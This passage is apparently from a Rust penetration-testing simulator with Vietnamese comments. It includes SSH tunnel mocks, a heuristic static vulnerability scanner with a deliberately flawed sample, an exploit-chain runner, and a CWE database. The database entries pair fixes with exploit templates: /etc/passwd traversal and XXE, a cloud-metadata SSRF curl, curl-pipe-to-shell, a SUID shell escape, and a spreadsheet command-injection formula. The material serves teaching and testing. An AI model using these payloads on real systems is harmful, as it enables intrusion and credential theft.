    /// `whoami` (nếu có) và đối chiếu với trạng thái quyền hạn thực tế của shell.
    pub fn verify(&self, shell: &MockShell) -> VerificationResult {
        let whoami_evidence = shell
            .history
            .iter()
            .rev()
            .find(|(cmd, _)| cmd.trim() == "whoami")
            .map(|(_, out)| out.clone());

        let actual_user = whoami_evidence
            .clone()
            .unwrap_or_else(|| shell.current_user.clone());
        let user_ok = actual_user.trim() == self.expected_user;
        let privilege_ok = if self.expected_user == "root" {
            shell.is_root
        } else {
            true
        };
        let verified = user_ok && privilege_ok;

        let method = if whoami_evidence.is_some() {
            "thực thi lệnh `whoami` và đối chiếu với kỳ vọng"
        } else {
            "đối chiếu trạng thái phiên của shell với kỳ vọng"
        };

        let details = if verified {
            format!(
                "Bằng chứng độc lập xác nhận người dùng hiện tại là `{}` — lời khai của tác nhân được xác nhận.",
                self.expected_user
            )
        } else {
            format!(
                "Lời khai của tác nhân bị BÁC BỎ: kỳ vọng `{}` nhưng bằng chứng thực thi cho thấy `{}`.",
                self.expected_user,
                actual_user.trim()
            )
        };

        VerificationResult {
            verified,
            proof: format!("whoami -> {}", actual_user.trim()),
            method: method.to_string(),
            details,
        }
    }

    /// Kiểm chứng bằng cách thực thi một lệnh cụ thể.
    pub fn verify_with_command(&self, shell: &mut MockShell, cmd: &str) -> VerificationResult {
        let output = shell.execute(cmd);
        self.verify_output(&output)
    }

    /// Kiểm chứng trực tiếp từ một đầu ra lệnh.
    pub fn verify_output(&self, output: &str) -> VerificationResult {
        let trimmed = output.trim();
        let verified = trimmed == self.expected_user;
        VerificationResult {
            verified,
            proof: format!("output -> {trimmed}"),
            method: "đối chiếu đầu ra lệnh với kỳ vọng".to_string(),
            details: if verified {
                format!("Đầu ra lệnh khớp với kỳ vọng `{}`.", self.expected_user)
            } else {
                format!(
                    "Đầu ra lệnh `{}` không khớp với kỳ vọng `{}` — lời khai bị bác bỏ.",
                    trimmed, self.expected_user
                )
            },
        }
    }
}

// ============================================================================
// 9. ĐỘNG CƠ XOAY CHIỀU MẠNG (MIRROR CHƯƠNG 103)
// ============================================================================

/// Loại đường hầm SSH.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TunnelType {
    /// Chuyển tiếp cổng cục bộ (`ssh -L`).
    LocalForward,
    /// Chuyển tiếp cổng từ xa (`ssh -R`).
    RemoteForward,
    /// Proxy SOCKS động (`ssh -D`).
    DynamicSocks,
}

/// Một phiên đường hầm SSH.
#[derive(Debug, Clone, PartialEq)]
pub struct SshTunnel {
    /// Loại đường hầm.
    pub tunnel_type: TunnelType,
    /// Địa chỉ lắng nghe cục bộ.
    pub listen_addr: SocketAddr,
    /// Địa chỉ đích.
    pub target_addr: SocketAddr,
    /// Mã phiên.
    pub session_id: u32,
    /// Phiên còn hoạt động hay không.
    pub active: bool,
}

/// Bộ mô phỏng đường hầm SSH.
#[derive(Debug, Clone, PartialEq)]
pub struct SshTunnelSimulator {
    /// Danh sách đường hầm.
    pub tunnels: Vec<SshTunnel>,
    /// Mã phiên kế tiếp.
    pub next_session_id: u32,
}

impl SshTunnelSimulator {
    /// Tạo bộ mô phỏng rỗng.
    pub fn new() -> Self {
        Self {
            tunnels: Vec::new(),
            next_session_id: 1,
        }
    }

    /// Mở đường hầm chuyển tiếp cổng cục bộ.
    pub fn local_forward(&mut self, listen: SocketAddr, target: SocketAddr) -> u32 {
        self.open(TunnelType::LocalForward, listen, target)
    }

    /// Mở đường hầm chuyển tiếp cổng từ xa.
    pub fn remote_forward(&mut self, listen: SocketAddr, target: SocketAddr) -> u32 {
        self.open(TunnelType::RemoteForward, listen, target)
    }

    /// Mở đường hầm proxy SOCKS động.
    pub fn dynamic_socks(&mut self, listen: SocketAddr) -> u32 {
        self.open(
            TunnelType::DynamicSocks,
            listen,
            SocketAddr::new(Ipv4Addr::UNSPECIFIED.into(), 0),
        )
    }

    /// Mở một đường hầm với loại cho trước.
    fn open(&mut self, tunnel_type: TunnelType, listen: SocketAddr, target: SocketAddr) -> u32 {
        let session_id = self.next_session_id;
        self.next_session_id += 1;
        self.tunnels.push(SshTunnel {
            tunnel_type,
            listen_addr: listen,
            target_addr: target,
            session_id,
            active: true,
        });
        session_id
    }

    /// Đóng một đường hầm theo mã phiên.
    pub fn close_tunnel(&mut self, session_id: u32) -> bool {
        if let Some(tunnel) = self.tunnels.iter_mut().find(|t| t.session_id == session_id) {
            tunnel.active = false;
            return true;
        }
        false
    }

    /// Số đường hầm còn hoạt động.
    pub fn active_tunnels(&self) -> usize {
        self.tunnels.iter().filter(|t| t.active).count()
    }

    /// Mô tả trạng thái các đường hầm.
    pub fn describe(&self) -> String {
        let mut out = String::new();
        for tunnel in &self.tunnels {
            out.push_str(&format!(
                "#{} {:?} {} -> {} [{}]\n",
                tunnel.session_id,
                tunnel.tunnel_type,
                tunnel.listen_addr,
                tunnel.target_addr,
                if tunnel.active { "active" } else { "closed" }
            ));
        }
        out
    }
}

impl Default for SshTunnelSimulator {
    fn default() -> Self {
        Self::new()
    }
}

/// Sinh dòng lệnh `ssh` tương ứng với một đường hầm.
pub fn ssh_command_line(tunnel: &SshTunnel) -> String {
    let listen_port = tunnel.listen_addr.port();
    match tunnel.tunnel_type {
        TunnelType::LocalForward => format!(
            "ssh -N -L {listen_port}:{}:{} user@jump",
            tunnel.target_addr.ip(),
            tunnel.target_addr.port()
        ),
        TunnelType::RemoteForward => format!(
            "ssh -N -R {listen_port}:{}:{} user@jump",
            tunnel.target_addr.ip(),
            tunnel.target_addr.port()
        ),
        TunnelType::DynamicSocks => format!("ssh -N -D {listen_port} user@jump"),
    }
}

/// Chuỗi relay SOCKS nhiều lớp.
#[derive(Debug, Clone, PartialEq)]
pub struct SocksRelayChain {
    /// Danh sách các lớp trung gian.
    pub hops: Vec<SocketAddr>,
}

impl SocksRelayChain {
    /// Tạo chuỗi relay rỗng.
    pub fn new() -> Self {
        Self { hops: Vec::new() }
    }

    /// Thêm một lớp trung gian.
    pub fn add_hop(&mut self, addr: SocketAddr) -> &mut Self {
        self.hops.push(addr);
        self
    }

    /// Số lớp trung gian.
    pub fn hop_count(&self) -> usize {
        self.hops.len()
    }

    /// Dựng đường đi mô phỏng từ client tới đích.
    pub fn resolve_path(&self, target: &str, port: u16) -> Vec<String> {
        let mut path = vec!["client".to_string()];
        for hop in &self.hops {
            path.push(format!("hop {}", hop));
        }
        path.push(format!("{target}:{port}"));
        path
    }

    /// Tổng độ trễ của chuỗi (giá trị truyền vào theo thứ tự các lớp).
    pub fn total_latency_ms(&self, hop_latencies: &[f64]) -> f64 {
        hop_latencies.iter().sum()
    }
}

impl Default for SocksRelayChain {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// 10. BỘ QUÉT LỖ HỔNG TĨNH THEO HEURISTIC (MIRROR `vulnhuntr`)
// ============================================================================

/// Một phát hiện của bộ quét tĩnh.
#[derive(Debug, Clone, PartialEq)]
pub struct StaticFinding {
    /// Số dòng phát hiện (đếm từ 1).
    pub line: usize,
    /// Định danh luật.
    pub rule: String,
    /// Mã CWE tương ứng.
    pub cwe: String,
    /// Mức độ nghiêm trọng.
    pub severity: Severity,
    /// Đoạn mã nguồn gây nghi ngờ.
    pub snippet: String,
    /// Thông điệp giải thích.
    pub message: String,
}

/// Định nghĩa một luật heuristic của bộ quét tĩnh.
#[derive(Debug, Clone, Copy)]
struct StaticRuleDef {
    /// Định danh luật.
    id: &'static str,
    /// Mã CWE.
    cwe: &'static str,
    /// Mức độ nghiêm trọng.
    severity: Severity,
    /// Mẫu văn bản cần xuất hiện.
    pattern: &'static str,
    /// Thông điệp giải thích.
    message: &'static str,
}

/// Danh mục 14 luật heuristic của bộ quét tĩnh.
const STATIC_RULES: &[StaticRuleDef] = &[
    StaticRuleDef {
        id: "unsafe-block",
        cwe: "CWE-119",
        severity: Severity::High,
        pattern: "unsafe {",
        message: "Khối `unsafe` không kiểm tra con trỏ null trước khi tham chiếu.",
    },
    StaticRuleDef {
        id: "unchecked-cast",
        cwe: "CWE-190",
        severity: Severity::Medium,
        pattern: "as usize",
        message: "Ép kiểu sang `usize` không kiểm tra tràn số.",
    },
    StaticRuleDef {
        id: "truncating-cast",
        cwe: "CWE-190",
        severity: Severity::Medium,
        pattern: "as u8",
        message: "Ép kiểu cắt cụt số nguyên có thể làm mất dữ liệu hoặc đổi ngữ nghĩa.",
    },
    StaticRuleDef {
        id: "unwrap-in-library",
        cwe: "CWE-248",
        severity: Severity::Low,
        pattern: ".unwrap()",
        message: "`unwrap()` làm sập tiến trình khi gặp lỗi — nên dùng `?`.",
    },
    StaticRuleDef {
        id: "format-injection",
        cwe: "CWE-134",
        severity: Severity::Medium,
        pattern: "format!(",
        message: "Định dạng chuỗi với dữ liệu không tin cậy có thể gây rò rỉ thông tin.",
    },
    StaticRuleDef {
        id: "get-unchecked",
        cwe: "CWE-125",
        severity: Severity::High,
        pattern: "get_unchecked",
        message: "`get_unchecked` bỏ qua hoàn toàn kiểm tra biên chỉ số.",
    },
    StaticRuleDef {
        id: "transmute",
        cwe: "CWE-704",
        severity: Severity::High,
        pattern: "transmute",
        message: "`transmute` ép kiểu không kiểm tra kích thước hay tính hợp lệ.",
    },
    StaticRuleDef {
        id: "set-len",
        cwe: "CWE-119",
        severity: Severity::High,
        pattern: "set_len",
        message: "`set_len` đặt độ dài vector vượt quá dung lượng đã cấp phát.",
    },
    StaticRuleDef {
        id: "from-raw-parts",
        cwe: "CWE-125",
        severity: Severity::High,
        pattern: "from_raw_parts",
        message: "`from_raw_parts` với độ dài không được kiểm chứng dẫn tới đọc ngoài vùng nhớ.",
    },
    StaticRuleDef {
        id: "command-injection",
        cwe: "CWE-78",
        severity: Severity::Critical,
        pattern: "Command::new",
        message: "Khởi tạo tiến trình từ chuỗi — nguy cơ OS Command Injection.",
    },
    StaticRuleDef {
        id: "sql-concatenation",
        cwe: "CWE-89",
        severity: Severity::High,
        pattern: "\"SELECT ",
        message: "Câu lệnh SQL được dựng bằng nối chuỗi — nguy cơ SQL Injection.",
    },
    StaticRuleDef {
        id: "sql-format",
        cwe: "CWE-89",
        severity: Severity::High,
        pattern: "format!(\"SELECT",
        message: "Truy vấn SQL dựng bằng `format!` với dữ liệu người dùng — nguy cơ SQL Injection.",
    },
    StaticRuleDef {
        id: "path-join",
        cwe: "CWE-22",
        severity: Severity::High,
        pattern: ".join(",
        message: "Nối đường dẫn từ dữ liệu không tin cậy — nguy cơ Path Traversal.",
    },
    StaticRuleDef {
        id: "mem-forget",
        cwe: "CWE-401",
        severity: Severity::Medium,
        pattern: "mem::forget",
        message: "`mem::forget` trong vòng lặp làm rò rỉ bộ nhớ không thể hoàn lại.",
    },
];

/// Bộ quét lỗ hổng tĩnh dựa trên heuristic mã nguồn.
#[derive(Debug, Clone, PartialEq)]
pub struct StaticVulnScanner {
    /// Các phát hiện đã thu thập.
    pub findings: Vec<StaticFinding>,
}

impl StaticVulnScanner {
    /// Tạo bộ quét rỗng.
    pub fn new() -> Self {
        Self {
            findings: Vec::new(),
        }
    }

    /// Danh sách luật: `(định danh, CWE, mẫu)`.
    pub fn rules() -> Vec<(&'static str, &'static str, &'static str)> {
        STATIC_RULES
            .iter()
            .map(|r| (r.id, r.cwe, r.pattern))
            .collect()
    }

    /// Quét một đoạn mã nguồn và trả về các phát hiện.
    pub fn scan(&mut self, code: &str) -> Vec<StaticFinding> {
        let mut out = Vec::new();
        for (index, line) in code.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with("//") {
                continue;
            }
            for rule in STATIC_RULES {
                if trimmed.contains(rule.pattern) {
                    out.push(StaticFinding {
                        line: index + 1,
                        rule: rule.id.to_string(),
                        cwe: rule.cwe.to_string(),
                        severity: rule.severity,
                        snippet: trimmed.chars().take(140).collect(),
                        message: rule.message.to_string(),
                    });
                }
            }
        }
        self.findings.extend(out.iter().cloned());
        out
    }

    /// Quét một tệp trên đĩa (trả về rỗng nếu không đọc được).
    pub fn scan_file(&mut self, path: &str) -> Vec<StaticFinding> {
        match fs::read_to_string(path) {
            Ok(content) => self.scan(&content),
            Err(_) => Vec::new(),
        }
    }

    /// Số loại luật khác nhau đã từng khớp.
    pub fn distinct_rules(&self) -> usize {
        let mut rules: Vec<&str> = self.findings.iter().map(|f| f.rule.as_str()).collect();
        rules.sort_unstable();
        rules.dedup();
        rules.len()
    }
}

impl Default for StaticVulnScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// Đoạn mã Rust cố ý chứa lỗi — dùng làm mẫu cho bộ quét tĩnh.
pub const VULNERABLE_SAMPLE_CODE: &str = r#"// Đoạn mã mẫu cố ý chứa lỗi (chỉ dùng để kiểm thử bộ quét tĩnh)
fn vulnerable(user_input: &str) {
    unsafe {
        let ptr = user_input.as_ptr();
        let value = *ptr;
        let n = user_input.len() as usize;
        let bytes = std::slice::from_raw_parts(ptr, n);
        let first = bytes.get_unchecked(0);
        let raw: u64 = std::mem::transmute(0u32);
        let mut buffer: Vec<u8> = Vec::new();
        buffer.set_len(10);
        let truncated = value as u8;
        let command = format!("ls {}", user_input);
        std::process::Command::new(command).spawn();
        let query = format!("SELECT * FROM users WHERE name = '{}'", user_input);
        let path = std::path::Path::new("/var").join(user_input);
        let maybe: Option<u8> = None;
        let forced = maybe.unwrap();
        std::mem::forget(forced);
        println!("{truncated} {raw} {query} {path:?} {first}");
    }
}
"#;

// ============================================================================
// 11. CƠ SỞ DỮ LIỆU LỖ HỔNG OSCP
// ============================================================================

/// Một mục trong cơ sở dữ liệu lỗ hổng.
#[derive(Debug, Clone, PartialEq)]
pub struct VulnEntry {
    /// Mã CWE.
    pub cwe: String,
    /// Tên lỗ hổng.
    pub name: String,
    /// Điểm CVSS.
    pub cvss: f64,
    /// Mức độ nghiêm trọng.
    pub severity: Severity,
    /// Khuyến nghị khắc phục.
    pub remediation: String,
    /// Khung khai thác mẫu.
    pub exploit_template: String,
}

/// Cơ sở dữ liệu lỗ hổng tiêu chuẩn.
#[derive(Debug, Clone, PartialEq)]
pub struct VulnDatabase {
    /// Danh sách mục lỗ hổng.
    pub entries: Vec<VulnEntry>,
}

impl VulnDatabase {
    /// Dựng cơ sở dữ liệu lỗ hổng tiêu chuẩn gồm hơn 50 mục OSCP phổ biến.
    pub fn standard() -> Self {
        #[rustfmt::skip]
        const ROWS: &[(&str, &str, f64, &str, &str)] = &[
            ("CWE-89", "SQL Injection", 9.8, "Dùng truy vấn tham số hóa (prepared statement), không nối chuỗi.", "SELECT * FROM accounts WHERE id = {id}"),
            ("CWE-78", "OS Command Injection", 8.8, "Tránh truyền chuỗi vào shell; dùng API gọi tiến trình với danh sách tham số.", "cmd.exe /c {input}"),
            ("CWE-79", "Cross-Site Scripting (Reflected)", 6.1, "Mã hoá đầu ra theo ngữ cảnh và dùng CSP.", "<script>{payload}</script>"),
            ("CWE-22", "Path Traversal", 7.5, "Chuẩn hoá đường dẫn và kiểm tra nó nằm trong thư mục gốc.", "GET /index.php?page=../../etc/passwd"),
            ("CWE-798", "Use of Hard-coded Credentials", 9.8, "Đưa bí mật vào kho bí mật, xoay vòng định kỳ.", "mysql -u svc_backup -pBackup2024"),
            ("CWE-327", "Use of a Broken or Risky Cryptographic Algorithm", 7.5, "Dùng thuật toán đã được phân tích (AES-GCM, ChaCha20-Poly1305).", "hash = md5(password)"),
            ("CWE-306", "Missing Authentication for Critical Function", 8.1, "Yêu cầu xác thực trước mọi thao tác quản trị.", "curl http://target/admin/export"),
            ("CWE-434", "Unrestricted Upload of File with Dangerous Type", 8.6, "Kiểm tra magic bytes, lưu ngoài web root, cấm thực thi tệp tải lên.", "upload shell.php.jpg"),
            ("CWE-862", "Missing Authorization", 8.1, "Kiểm tra quyền của người dùng ở mọi endpoint.", "GET /api/admin/users"),
            ("CWE-502", "Deserialization of Untrusted Data", 8.1, "Không deserialize dữ liệu không tin cậy; dùng định dạng dữ liệu an toàn.", "python -c 'import pickle;pickle.loads(data)'"),
            ("CWE-918", "Server-Side Request Forgery (SSRF)", 8.6, "Danh sách trắng đích ra ngoài và chặn địa chỉ nội bộ/metadata.", "curl http://169.254.169.254/latest/meta-data/"),
            ("CWE-94", "Improper Control of Generation of Code", 9.8, "Không sinh mã từ đầu vào người dùng; dùng thư viện thay vì `eval`.", "eval(user_input)"),
            ("CWE-611", "Improper Restriction of XML External Entity Reference", 8.6, "Tắt DTD và thực thể ngoài trong trình phân tích XML.", "<!DOCTYPE x [ <!ENTITY e SYSTEM 'file:///etc/passwd'> ]>"),
            ("CWE-287", "Improper Authentication", 8.1, "Bắt buộc xác thực nhiều yếu tố cho tài khoản quản trị.", "Authorization: Basic YWRtaW46YWRtaW4="),
            ("CWE-732", "Incorrect Permission Assignment for Critical Resource", 7.8, "Đặt quyền tối thiểu (0750/0640) cho tài nguyên nhạy cảm.", "chmod 777 /opt/app/config"),
            ("CWE-269", "Improper Privilege Management", 7.8, "Gỡ cờ SUID và giới hạn quyền theo vai trò.", "find . -exec /bin/sh -p \\; \\;"),
            ("CWE-250", "Execution with Unnecessary Privileges", 6.5, "Chạy dịch vụ bằng tài khoản không đặc quyền.", "sudo -u wwwservice ./app"),
            ("CWE-16", "Configuration", 5.3, "Quản lý cấu hình tập trung, không để mặc định yếu.", "config.debug = true"),
            ("CWE-330", "Use of Insufficiently Random Values", 7.5, "Sinh nonce bằng CSPRNG.", "token = random.randint(0, 999999)"),
            ("CWE-521", "Weak Password Requirements", 7.5, "Đặt độ dài tối thiểu 14 ký tự và bộ ký tự phức tạp.", "user:guest/123456"),
            ("CWE-264", "Permissions, Privileges, and Access Controls", 7.5, "Áp dụng nguyên tắc đặc quyền tối thiểu.", "chmod 660 /etc/shadow"),
            ("CWE-377", "Insecure Temporary File", 7.5, "Dùng `mkstemp`/thư mục riêng có quyền hạn chặt.", "mktemp /tmp/backup"),
            ("CWE-384", "Session Fixation", 7.5, "Tạo lại mã phiên sau khi đăng nhập.", "session_id = request.cookie['sid']"),
            ("CWE-400", "Uncontrolled Resource Consumption", 7.5, "Giới hạn độ dài đầu vào và số lượng kết nối đồng thời.", "cat huge_file"),
            ("CWE-404", "Improper Resource Shutdown or Release", 5.3, "Giải phóng tài nguyên trong `Drop`/khối `finally`.", "let f = File::open(path)?"),
            ("CWE-405", "Asymmetric Resource Consumption", 5.3, "Áp dụng giới hạn tài nguyên đối xứng cho cả hai phía.", "zip bomb 42.zip"),
            ("CWE-409", "Improper Handling of Highly Compressed Data", 7.5, "Giới hạn tỉ lệ nén và kích thước giải nén.", "gunzip payload.gz"),
            ("CWE-436", "Interpretation Conflict", 6.5, "Chuẩn hoá và kiểm tra dữ liệu trước khi diễn giải.", "Content-Type: text/plain vs application/json"),
            ("CWE-470", "Use of Externally-Controlled Input to Select Classes or Code", 8.1, "Dùng allow-list khi chọn lớp/thành phần.", "Class.forName(user_class)"),
            ("CWE-494", "Download of Code Without Integrity Check", 8.1, "Xác minh chữ ký/checksum khi tải mã về.", "curl http://cdn/update.sh | sh"),
            ("CWE-522", "Insufficiently Protected Credentials", 7.5, "Lưu bí mật bằng kho bí mật, không lưu bản rõ.", "password = \"admin123\""),
            ("CWE-532", "Insertion of Sensitive Information into Log File", 5.5, "Lọc thông tin bí mật trước khi ghi log.", "log.info(\"token={token}\")"),
            ("CWE-601", "URL Redirection to Untrusted Site", 6.1, "Chỉ chuyển hướng tới các đích trong allow-list.", "GET /redirect?url=http://evil.tld"),
            ("CWE-668", "Exposure of Resource to Wrong Sphere", 6.5, "Kiểm tra ranh giới tin cậy giữa các tenant/service.", "shared /tmp/cache"),
            ("CWE-915", "Improperly Controlled Modification of Dynamically-Determined Object Attributes", 8.1, "Chặn thuộc tính nguy hiểm (`__proto__`, `constructor`).", "user['__proto__']['admin'] = true"),
            ("CWE-916", "Use of Password Hash With Insufficient Computational Effort", 7.5, "Dùng Argon2id/bcrypt/scrypt với hệ số công suất cao.", "hash = sha256(password)"),
            ("CWE-1021", "Improper Restriction of Rendered UI Layers", 6.5, "Kiểm tra quyền ở tầng API, không chỉ ở giao diện.", "GET /ui/admin (ẩn nút thôi)"),
            ("CWE-1236", "Improper Neutralization of Formula Elements", 7.5, "Vô hiệu hoá công thức spreadsheet khi xuất CSV.", "=cmd|' /C calc'!A0"),
            ("CWE-1275", "Sensitive Cookie with Improper SameSite Attribute", 6.1, "Đặt `SameSite=Strict` và `Secure` cho cookie phiên.", "Set-Cookie: sid=abc"),
            ("CWE-1321", "Improperly Controlled Modification of Object Prototype Attributes", 8.8, "Lọc khoá nguy hiểm khi hợp nhất đối tượng.", "merge(user_json)"),
            ("CWE-1333", "Inefficient Regular Expression Complexity", 7.5, "Tránh biểu thức chính có lồng nhau không giới hạn.", "re.match('(a+)+$', data)"),
            ("CWE-1394", "Use of Default Credentials", 9.8, "Đổi mật khẩu mặc định ngay khi triển khai.", "telnet 10.10.50.10 / admin:admin"),
            ("CWE-200", "Exposure of Sensitive Information to an Unauthorized Actor", 7.5, "Lọc dữ liệu nhạy cảm trước khi trả về.", "GET /api/user?id=1"),
            ("CWE-209", "Information Exposure Through an Error Message", 5.3, "Trả thông báo lỗi chung chung, ghi chi tiết vào log nội bộ.", "err.stack"),
            ("CWE-312", "Cleartext Storage of Sensitive Information", 7.5, "Mã hoá dữ liệu nhạy cảm khi lưu trữ.", "db.save(password_plain)"),
            ("CWE-319", "Cleartext Transmission of Sensitive Information", 7.4, "Bắt buộc TLS và chuyển hướng HTTP → HTTPS.", "http://target/login"),
            ("CWE-326", "Inadequate Encryption Strength", 7.5, "Dùng khóa/IV ngẫu nhiên đủ độ dài cho thuật toán.", "cipher = DES.new(key)"),
            ("CWE-347", "Improper Verification of Cryptographic Signature", 8.1, "Kiểm tra chữ ký và chuỗi tin cậy đầy đủ.", "jwt.verify(token, key, algorithms=None)"),
            ("CWE-352", "Cross-Site Request Forgery", 8.1, "Dùng CSRF token và SameSite cookie.", "POST /admin/delete"),
            ("CWE-590", "Free Memory after Effective Lifetime", 5.3, "Thu hồi khoá/phiên theo vòng đời.", "session_cache.clear()"),
            ("CWE-598", "Use of GET Request Method With Sensitive Query Strings", 6.5, "Dùng POST cho dữ liệu nhạy cảm.", "GET /login?password=secret"),
            ("CWE-693", "Protection Mechanism Failure", 7.5, "Bảo đảm cơ chế bảo vệ luôn được áp dụng đồng nhất.", "if role == 'admin' { } // thiếu else"),
            ("CWE-703", "Improper Check or Handling of Exceptional Conditions", 6.5, "Xử lý mọi nhánh lỗi một cách tường minh.", "unwrap()"),
            ("CWE-772", "Missing Release of Resource after Effective Lifetime", 6.5, "Đóng file/socket khi ra khỏi phạm vi.", "File::open(path)?"),
            ("CWE-776", "Improper Restriction of Recursive Entity References", 7.5, "Giới hạn độ sâu tham chiếu thực thể XML.", "<!ENTITY a '&b;'>"),
            ("CWE-787", "Out-of-bounds Write", 9.8, "Kiểm tra biên trước mọi phép ghi.", "buf[input.len()] = 0;"),
            ("CWE-125", "Out-of-bounds Read", 7.5, "Kiểm tra biên trước mọi phép đọc.", "read(buf, input.len())"),
            ("CWE-190", "Integer Overflow or Wraparound", 8.1, "Dùng phép cộng có kiểm tra tràn.", "let n = a + b;"),
            ("CWE-416", "Use After Free", 8.8, "Không dùng con trỏ sau khi giải phóng.", "free(p); *p = 1;"),
            ("CWE-476", "NULL Pointer Dereference", 7.5, "Kiểm tra con trỏ null trước khi tham chiếu.", "let x = *ptr;"),
            ("CWE-134", "Use of Externally-Controlled Format String", 8.8, "Không truyền chuỗi người dùng làm định dạng.", "printf(user_input)"),
            ("CWE-120", "Buffer Copy without Checking Size of Input", 9.8, "Kiểm tra độ dài đầu vào trước khi sao chép.", "memcpy(dst, input, input_len)"),
            ("CWE-121", "Stack-based Buffer Overflow", 9.8, "Dùng `Vec`/slice có kiểm tra biên thay cho mảng cố định.", "strcpy(buf, input)"),
            ("CWE-88", "Improper Neutralization of Argument Delimiters in a Command", 8.8, "Truyền tham số dạng mảng, không nối chuỗi.", "exec(\"sh -c \" + user)"),
        ];

        let entries = ROWS
            .iter()
            .map(
                |(cwe, name, cvss, remediation, exploit_template)| VulnEntry {
                    cwe: (*cwe).to_string(),
                    name: (*name).to_string(),
                    cvss: *cvss,
                    severity: Severity::from_cvss(*cvss),
                    remediation: (*remediation).to_string(),
                    exploit_template: (*exploit_template).to_string(),
                },
            )
            .collect();

        Self { entries }
    }

    /// Số mục trong cơ sở dữ liệu.
    pub fn len(&self) -> usize {
        self.entries.len()
    }

    /// Cơ sở dữ liệu có rỗng không.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Tìm mục theo mã CWE.
    pub fn by_cwe(&self, cwe: &str) -> Option<&VulnEntry> {
        let needle = cwe.trim().to_ascii_uppercase();
        self.entries
            .iter()
            .find(|e| e.cwe.to_ascii_uppercase() == needle)
    }

    /// Lọc các mục theo mức độ nghiêm trọng.
    pub fn by_severity(&self, severity: Severity) -> Vec<&VulnEntry> {
        self.entries
            .iter()
            .filter(|e| e.severity == severity)
            .collect()
    }

    /// Kiểm tra một CWE có trong cơ sở dữ liệu hay không.
    pub fn contains(&self, cwe: &str) -> bool {
        self.by_cwe(cwe).is_some()
    }
}

impl Default for VulnDatabase {
    fn default() -> Self {
        Self::standard()
    }
}
// ============================================================================
// 12. ĐIỀU PHỐI CHUỖI KHAI THÁC 6 GIAI ĐOẠN
// ============================================================================

/// Một giai đoạn của chuỗi khai thác.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Phase {
    /// Trinh sát mạng.
    Recon,
    /// Khai thác ứng dụng web.
    WebExploit,
    /// Khai thác nhị phân.
    BinaryExploit,
    /// Tấn công thông tin xác thực.
    CredentialAttack,
    /// Leo thang đặc quyền.
    PrivEsc,
    /// Xoay chiều mạng.
    Pivot,
    /// Tổng hợp báo cáo.
    Report,
}

impl Phase {
    /// Nhãn tiếng Việt của giai đoạn.
    pub fn label(&self) -> &'static str {
        match self {
            Phase::Recon => "Trinh sát",
            Phase::WebExploit => "Khai thác Web",
            Phase::BinaryExploit => "Khai thác Nhị phân",
            Phase::CredentialAttack => "Tấn công Xác thực",
            Phase::PrivEsc => "Leo thang Đặc quyền",
            Phase::Pivot => "Xoay chiều Mạng",
            Phase::Report => "Báo cáo",
        }
    }
}

/// Một bước trong chuỗi khai thác.
#[derive(Debug, Clone, PartialEq)]
pub struct ChainStep {
    /// Giai đoạn của bước.
    pub phase: Phase,
    /// Mục tiêu của bước.
    pub target: String,
    /// Hành động đã thực hiện.
    pub action: String,
    /// Bước có thành công hay không.
    pub success: bool,
    /// Bằng chứng của bước.
    pub evidence: String,
    /// Thời gian mô phỏng (ms).
    pub duration_ms: u64,
}

/// Kết quả của một lần chạy chuỗi khai thác đầu-cuối.
#[derive(Debug, Clone, PartialEq)]
pub struct ExploitChainResult {
    /// Các bước đã thực hiện.
    pub steps: Vec<ChainStep>,
    /// Danh sách máy chủ đã bị chiếm quyền.
    pub compromised_hosts: Vec<Ipv4Addr>,
    /// Các lỗ hổng đã được chứng minh.
    pub findings: Vec<Vulnerability>,
    /// Bằng chứng khai thác tương ứng (cùng thứ tự với `findings`).
    pub proofs: Vec<ProofByExploitation>,
    /// Tổng thời gian mô phỏng (ms).
    pub total_duration_ms: u64,
    /// Toàn bộ chuỗi có thành công hay không.
    pub success: bool,
}

/// Bộ điều phối chuỗi khai thác 6 giai đoạn.
#[derive(Debug, Clone, PartialEq)]
pub struct ExploitChainRunner {
    /// Mạng mục tiêu.
    pub network: MockNetwork,
    /// Các lỗ hổng đã được chứng minh.
    pub findings: Vec<Vulnerability>,
    /// Bằng chứng khai thác tương ứng.
    pub proofs: Vec<ProofByExploitation>,
}

impl ExploitChainRunner {
    /// Tạo bộ điều phối trên một mạng mục tiêu.
    pub fn new(network: MockNetwork) -> Self {
        Self {
            network,
            findings: Vec::new(),
            proofs: Vec::new(),
        }
    }

    /// Chạy trọn chuỗi khai thác và trả về kết quả tổng hợp.
    pub fn run(&mut self) -> ExploitChainResult {
        self.findings.clear();
        self.proofs.clear();

        let mut steps: Vec<ChainStep> = Vec::new();
        steps.extend(self.phase_recon());
        steps.extend(self.phase_web());
        steps.extend(self.phase_binary());
        steps.extend(self.phase_credentials());
        steps.extend(self.phase_privesc());
        steps.extend(self.phase_pivot());

        let finding_count = self.findings.len();
        let proof_count = self.proofs.len();
        steps.push(ChainStep {
            phase: Phase::Report,
            target: "10.10.0.0/16".to_string(),
            action: "Tổng hợp báo cáo kiểm thử xâm nhập".to_string(),
            success: finding_count > 0 && finding_count == proof_count,
            evidence: format!("{finding_count} phát hiện / {proof_count} PoC đã xác minh"),
            duration_ms: 6,
        });

        let total_duration_ms: u64 = steps.iter().map(|s| s.duration_ms).sum();
        let compromised_hosts: Vec<Ipv4Addr> = self
            .network
            .hosts
            .iter()
            .filter(|h| h.is_pwned)
            .map(|h| h.ip)
            .collect();
        let success = steps.iter().all(|s| s.success)
            && !self.findings.is_empty()
            && self.proofs.iter().all(|p| p.verify());

        ExploitChainResult {
            steps,
            compromised_hosts,
            findings: self.findings.clone(),
            proofs: self.proofs.clone(),
            total_duration_ms,
            success,
        }
    }

    /// Ghi nhận một lỗ hổng **chỉ khi** bằng chứng khai thác hợp lệ.
    fn register(&mut self, vuln: Vulnerability, proof: ProofByExploitation) -> bool {
        if !proof.verify() {
            return false;
        }
        self.findings.push(vuln);
        self.proofs.push(proof);
        true
    }

    /// Lấy mẫu lỗ hổng đã cài sẵn trong danh mục của máy chủ.
    fn template(&self, ip: Ipv4Addr, port: u16, cwe: &str) -> Option<Vulnerability> {
        self.network
            .host_at(ip)
            .and_then(|host| {
                host.vulnerabilities
                    .iter()
                    .find(|v| v.target_port == port && v.cwe == cwe)
            })
            .cloned()
